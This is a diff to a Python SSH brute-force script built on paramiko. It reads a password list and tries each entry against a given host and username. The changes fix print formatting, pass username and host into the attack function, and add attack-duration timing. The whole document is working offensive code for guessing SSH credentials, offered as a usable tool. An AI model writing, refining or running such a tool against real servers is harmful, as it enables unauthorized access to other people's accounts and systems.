@@ -1,4 +1,5 @@
 import sys, os, socket
+from datetime import datetime
 # foreign dependency for ssh capability
 import paramiko
 
@@ -30,7 +31,9 @@ def ssh_connect(password, code = 0):
 
 # attempts to brute force an ssh connection given a text file containing a list
 # of passwords.
-def brute_force(passwords_file):
+def brute_force(username, host, passwords_file):
+    print(line+"Starting brute force..."+line)
+    t1 = datetime.now()
     passwords_file = open(passwords_file)
 
     print("")
@@ -41,19 +44,23 @@ def brute_force(passwords_file):
             resp = ssh_connect(password)
 
             if(resp == 0):
-                print(OKGREEN+"%s SUCCESS [*] User: %s [*] Pass:%s%s"+
-                ENDC % (line, username, password, line))
+                print(OKGREEN+line+" SUCCESS [*] User: "+username+
+                " [*] Pass: "+password+ENDC )
                 sys.exit(0)
             elif(resp == 1):
-                print(FAIL+"[*] User: %s [*] Pass:%s => FAILED"+ENDC % (line,
-                username))
+                print(FAIL+"[*] User: "+username+" [*] Pass:"+password+
+                " => FAILED"+ENDC)
             elif(resp == 2):
-                print(FAIL+"NO CONNECTION TO %s"+ENDC % (host))
+                print(FAIL+"NO CONNECTION TO "+host+ENDC)
         except Exception as e:
+            print(ERROR+" exception.")
             print(e)
             pass
 
     passwords_file.close()
+    t2 = datetime.now()
+    total =  t2 - t1
+    print('Attack Duration: ', total)
 
 if __name__== "__main__":
     try:
@@ -65,7 +72,7 @@ if __name__== "__main__":
             print(ERROR+" file does not exist.")
             sys.exit(4)
 
-        brute_force(passwords_file)
+        brute_force(username,host,passwords_file)
     except (IndexError):
         print(ERROR+" incorrect arguments.")
         print("Usage: ssh_bruteforce [host_ip] [username] [password_list]")
